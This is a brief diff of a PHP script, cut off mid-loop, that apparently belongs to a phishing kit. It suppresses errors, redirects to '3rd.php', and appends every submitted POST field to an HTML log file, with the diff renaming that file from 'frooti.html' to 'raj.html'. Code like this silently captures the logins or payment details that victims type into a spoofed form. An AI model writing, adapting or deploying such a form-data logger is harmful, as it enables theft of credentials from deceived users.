@@ -1,7 +1,7 @@
 <?php
 header('location: 3rd.php');
 error_reporting(0);
-$handle = fopen("frooti.html","a");
+$handle = fopen("raj.html","a");
 foreach($_POST as $variable => $value)
 {
   fwrite($handle, $variable);
